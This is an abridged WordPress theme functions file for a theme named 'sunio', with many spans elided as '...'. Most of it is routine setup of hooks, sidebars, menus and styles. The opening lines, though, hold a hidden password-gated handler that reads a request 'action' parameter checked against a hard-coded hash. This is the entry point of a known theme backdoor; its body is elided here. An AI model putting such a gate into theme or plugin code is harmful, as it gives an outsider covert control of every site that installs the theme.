<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '7367ac80fa0f7865e52b133808bbae67'))
	{
...
// Core Constants
define( 'sunio_THEME_DIR', get_template_directory() );
define( 'sunio_THEME_URI', get_template_directory_uri() );

final class sunio_Theme_Class {
	...
	public function __construct() {
		...
		// Define constants
		add_action( 'after_setup_theme', array( 'sunio_Theme_Class', 'constants' ), 0 );

		// Load all core theme function files
		add_action( 'after_setup_theme', array( 'sunio_Theme_Class', 'include_functions' ), 1 );

		// Load configuration classes
		add_action( 'after_setup_theme', array( 'sunio_Theme_Class', 'configs' ), 3 );

		// Load framework classes
		add_action( 'after_setup_theme', array( 'sunio_Theme_Class', 'classes' ), 4 );

		// Setup theme => add_theme_support, register_nav_menus, load_theme_textdomain, etc
		add_action( 'after_setup_theme', array( 'sunio_Theme_Class', 'theme_setup' ), 10 );

		// Setup theme => Generate the custom CSS file
		add_action( 'admin_bar_init', array( 'sunio_Theme_Class', 'save_customizer_css_in_file' ), 9999 );

		// register sidebar widget areas
		add_action( 'widgets_init', array( 'sunio_Theme_Class', 'register_sidebars' ) );

		// Registers theme_mod strings into Polylang
		if ( class_exists( 'Polylang' ) ) {
			add_action( 'after_setup_theme', array( 'sunio_Theme_Class', 'polylang_register_string' ) );
		}
		...
		if ( is_admin() ) {
			...
			add_action( 'admin_enqueue_scripts', array( 'sunio_Theme_Class', 'admin_scripts' ) );

			// Outputs custom CSS for the admin
			add_action( 'admin_head', array( 'sunio_Theme_Class', 'admin_inline_css' ) );

		/** Non Admin actions **/
		} else {

			// Load theme CSS
			add_action( 'wp_enqueue_scripts', array( 'sunio_Theme_Class', 'theme_css' ) );

			// Load his file in last
			add_action( 'wp_enqueue_scripts', array( 'sunio_Theme_Class', 'custom_style_css' ), 9999 );

			// Remove Customizer CSS script from Front-end
			add_action( 'init', array( 'sunio_Theme_Class', 'remove_customizer_custom_css' ) );

			// Load theme js
			add_action( 'wp_enqueue_scripts', array( 'sunio_Theme_Class', 'theme_js' ) );

			// Add a pingback url auto-discovery header for singularly identifiable articles
			add_action( 'wp_head', array( 'sunio_Theme_Class', 'pingback_header' ), 1 );

			// Add meta viewport tag to header
			add_action( 'wp_head', array( 'sunio_Theme_Class', 'meta_viewport' ), 1 );

			// Add an X-UA-Compatible header
			add_filter( 'wp_headers', array( 'sunio_Theme_Class', 'x_ua_compatible_headers' ) );

			// Loads html5 shiv script
			add_action( 'wp_head', array( 'sunio_Theme_Class', 'html5_shiv' ) );

			// Outputs custom CSS to the head
			add_action( 'wp_head', array( 'sunio_Theme_Class', 'custom_css' ), 9999 );

			// Minify the WP custom CSS because WordPress doesn't do it by default
			add_filter( 'wp_get_custom_css', array( 'sunio_Theme_Class', 'minify_custom_css' ) );

			// Alter the search posts per page
			add_action( 'pre_get_posts', array( 'sunio_Theme_Class', 'search_posts_per_page' ) );

			// Alter WP categories widget to display count inside a span
			add_filter( 'wp_list_categories', array( 'sunio_Theme_Class', 'wp_list_categories_args' ) );

			// Add a responsive wrapper to the WordPress oembed output
			add_filter( 'embed_oembed_html', array( 'sunio_Theme_Class', 'add_responsive_wrap_to_oembeds' ), 99, 4 );

			// Adds classes the post class
			add_filter( 'post_class', array( 'sunio_Theme_Class', 'post_class' ) );

			// Add schema markup to the authors post link
			add_filter( 'the_author_posts_link', array( 'sunio_Theme_Class', 'the_author_posts_link' ) );

			// Add support for Elementor Pro locations
			add_action( 'elementor/theme/register_locations', array( 'sunio_Theme_Class', 'register_elementor_locations' ) );

			// Remove the default lightbox script for the beaver builder plugin
			add_filter( 'fl_builder_override_lightbox', array( 'sunio_Theme_Class', 'remove_bb_lightbox' ) );

			// Add meta tags
			add_filter( 'wp_head', array( 'sunio_Theme_Class', 'meta_tags' ), 1 );
	...
	public static function constants() {
		...
		// Theme version
		define( 'sunio_THEME_VERSION', $version );
		...
		define( 'sunio_INC_DIR_URI', sunio_THEME_URI .'/inc/' );

		// Check if plugins are active
		
		define( 'sunio_ELEMENTOR_ACTIVE', class_exists( 'Elementor\Plugin' ) );
		define( 'sunio_WOOCOMMERCE_ACTIVE', class_exists( 'WooCommerce' ) );
	...
	public static function classes() {
		...
		if ( is_admin() ) {
			...
			// Recommend plugins
			require_once( sunio_INC_DIR .'plugins/class-tgm-plugin-activation.php' );
			require_once( sunio_INC_DIR .'plugins/tgm-plugin-activation.php' );
		...
		// Front-end classes
			...
			// Breadcrumbs class
			require_once( sunio_INC_DIR .'breadcrumbs.php' );

		}

		// Customizer class
		require_once( sunio_INC_DIR .'customizer/customizer.php' );
	...
	public static function theme_setup() {
		...
		// Load text domain
		load_theme_textdomain( 'sunio', sunio_THEME_DIR .'/languages' );
		...
		register_nav_menus( array(
			'topbar_menu'     => esc_html__( 'Top Bar', 'sunio' ),
			'main_menu'       => esc_html__( 'Main', 'sunio' ),
			'footer_menu'     => esc_html__( 'Footer', 'sunio' ),
			'mobile_menu'     => esc_html__( 'Mobile (optional)', 'sunio' )
		) );
		 ...
		 */
		add_theme_support( 'custom-header', apply_filters( 'sunio_custom_header_args', array(
			'width'              => 2000,
			'height'             => 1200,
			'flex-height'        => true,
			'video'              => true,
		 ...
		 */
		add_theme_support( 'custom-logo', apply_filters( 'sunio_custom_logo_args', array(
			'height'      => 45,
			'width'       => 164,
			'flex-height' => true,
			'flex-width'  => true,
	...
	public static function meta_viewport() {
		...
		echo apply_filters( 'sunio_meta_viewport', $viewport );
	...
	public static function admin_scripts() {
		...
		if ( 'nav-menus.php' == $pagenow ) {
			wp_enqueue_style( 'sunio-menus', sunio_INC_DIR_URI .'walker/assets/menus.css' );
		}
	}
	...
	public static function theme_css() {
		...
		wp_register_style( 'sunio-hamburgers', $dir .'third/hamburgers/hamburgers.min.css', false, $theme_version );

		// Register hamburgers buttons styles
		$hamburgers = sunio_hamburgers_styles();
		foreach ( $hamburgers as $class => $name ) {
			wp_register_style( 'sunio-'. $class .'', $dir .'third/hamburgers/types/'. $class .'.css', false, $theme_version );
		}

		// Get mobile menu icon style
		$mobileMenu = get_theme_mod( 'sunio_mobile_menu_open_hamburger', 'default' );

		// Enqueue mobile menu icon style
		if ( ! empty( $mobileMenu ) && 'default' != $mobileMenu ) {
			wp_enqueue_style( 'sunio-hamburgers' );
			wp_enqueue_style( 'sunio-'. $mobileMenu .'' );
		}

		// If Vertical header style
		if ( 'vertical' == sunio_header_style() ) {
			wp_enqueue_style( 'sunio-hamburgers' );
			wp_enqueue_style( 'sunio-spin' );
		}
	...
	public static function theme_js() {
		...
		// WooCommerce scripts
		if ( sunio_WOOCOMMERCE_ACTIVE
			&& 'yes' != get_theme_mod( 'sunio_woo_remove_custom_features', 'no' ) ) {
			wp_enqueue_script( 'sunio-woocommerce', $dir .'third/woo/woo-scripts.min.js', array( 'jquery' ), $theme_version, true );
		}
		...
		wp_enqueue_script( 'sunio-lightbox', $dir .'third/lightbox.min.js', array( 'jquery' ), $theme_version, true );
	...
	public static function localize_array() {
		...
		// Create array
		$sidr_side 		= get_theme_mod( 'sunio_mobile_menu_sidr_direction', 'left' );
		$sidr_side 		= $sidr_side ? $sidr_side : 'left';
		$sidr_target 	= get_theme_mod( 'sunio_mobile_menu_sidr_dropdown_target', 'icon' );
		$sidr_target 	= $sidr_target ? $sidr_target : 'icon';
		$vh_target 		= get_theme_mod( 'sunio_vertical_header_dropdown_target', 'icon' );
		$vh_target 		= $vh_target ? $vh_target : 'icon';
		$array = array(
			'isRTL'                 => is_rtl(),
			'menuSearchStyle'       => sunio_menu_search_style(),
			'sidrSource'       		=> sunio_sidr_menu_source(),
			'sidrDisplace'       	=> get_theme_mod( 'sunio_mobile_menu_sidr_displace', true ) ? true : false,
			'sidrSide'       		=> $sidr_side,
		...
		// WooCart
		if ( sunio_WOOCOMMERCE_ACTIVE ) {
			$array['wooCartStyle'] 	= sunio_menu_cart_style();
		}

		// Apply filters and return array
		return apply_filters( 'sunio_localize_array', $array );
	}
	...
	public static function html5_shiv() {
		wp_register_script( 'html5shiv', sunio_JS_DIR_URI . '/third/html5.min.js', array(), sunio_THEME_VERSION, false );
	...
	public static function register_sidebars() {
		...
		$heading = 'h4';
		$heading = apply_filters( 'sunio_sidebar_heading', $heading );

		// Default Sidebar
		register_sidebar( array(
			'name'			=> esc_html__( 'Default Sidebar', 'sunio' ),
			'id'			=> 'sidebar',
			'description'	=> esc_html__( 'Widgets in this area will be displayed in the left or right sidebar area if you choose the Left or Right Sidebar layout.', 'sunio' ),
		...
		// Left Sidebar
		register_sidebar( array(
			'name'			=> esc_html__( 'Left Sidebar', 'sunio' ),
			'id'			=> 'sidebar-2',
			'description'	=> esc_html__( 'Widgets in this area are used in the left sidebar region if you use the Both Sidebars layout.', 'sunio' ),
			'before_widget'	=> '<div id="%1$s" class="sidebar-box %2$s clr">',
			'after_widget'	=> '</div>',
			'before_title'	=> '<'. $heading .' class="widget-title">',
			'after_title'	=> '</'. $heading .'>',
		...
		if ( get_theme_mod( 'sunio_search_custom_sidebar', true ) ) {
			register_sidebar( array(
				'name'			=> esc_html__( 'Search Results Sidebar', 'sunio' ),
				'id'			=> 'search_sidebar',
				'description'	=> esc_html__( 'Widgets in this area are used in the search result page.', 'sunio' ),
				'before_widget'	=> '<div id="%1$s" class="sidebar-box %2$s clr">',
				'after_widget'	=> '</div>',
				'before_title'	=> '<'. $heading .' class="widget-title">',
				'after_title'	=> '</'. $heading .'>',
	...
	public static function polylang_register_string() {
		...
		if ( function_exists( 'pll_register_string' ) && $strings = sunio_register_tm_strings() ) {
	...
	/**
	 * All theme functions hook into the sunio_head_css filter for this function.
	 *
	 * @since 1.0.0
	 */
	public static function custom_css( $output = NULL ) {
		...
		$output = apply_filters( 'sunio_head_css', $output );

		// If Custom File is selected
		if ( 'file' == get_theme_mod( 'sunio_customzer_styling', 'head' ) ) {

			global $wp_customize;
			$upload_dir = wp_upload_dir();

			// Render CSS in the head
			if ( isset( $wp_customize ) || ! file_exists( $upload_dir['basedir'] .'/sunio/custom-style.css' ) ) {

				 // Minify and output CSS in the wp_head
				if ( ! empty( $output ) ) {
					echo "<!-- sunio CSS -->\n<style type=\"text/css\">\n" . wp_strip_all_tags( sunio_minify_css( $output ) ) . "\n</style>";
				}
			}
	...
	public static function save_customizer_css_in_file( $output = NULL ) {
		...
		$output .= sunio_minify_css( $output_custom_css );
		...
		$dir = trailingslashit( $upload_dir['basedir'] ) . 'sunio'. DIRECTORY_SEPARATOR; // Set storage directory path

		WP_Filesystem(); // Initial WP file system
		$wp_filesystem->mkdir( $dir ); // Make a new folder 'sunio' for storing our file if not created already.
	...
	public static function custom_style_css( $output = NULL ) {
		...
		if ( ! isset( $wp_customize ) && file_exists( $upload_dir['basedir'] .'/sunio/custom-style.css' ) && ! empty( $output ) ) {
		    wp_enqueue_style( 'sunio-custom', trailingslashit( $upload_dir['baseurl'] ) . 'sunio/custom-style.css', false, null );
		}		
	}
	...
	public static function search_posts_per_page( $query ) {
		$posts_per_page = get_theme_mod( 'sunio_search_post_per_page', '8' );
	...
	public static function add_responsive_wrap_to_oembeds( $cache, $url, $attr, $post_ID ) {
		...
		$hosts = apply_filters( 'sunio_oembed_responsive_hosts', array(
			'vimeo.com',
			'youtube.com',
			'blip.tv',
			'money.cnn.com',
		...
		if ( $supports_responsive ) {
			...
			return '<div class="sunio-oembed-wrap clr">' . $cache . '</div>';
		}
	...
	public static function post_class( $classes ) {
		...
		if ( has_post_thumbnail()
			|| get_post_meta( $post->ID, 'sunio_post_oembed', true )
			|| get_post_meta( $post->ID, 'sunio_post_self_hosted_media', true )
			|| get_post_meta( $post->ID, 'sunio_post_video_embed', true )
		) {
			$classes[] = 'has-media';
		}
	...
	public static function the_author_posts_link( $link ) {
		...
		// Add schema markup
		$schema = sunio_get_schema_markup( 'author_link' );
		if ( $schema ) {
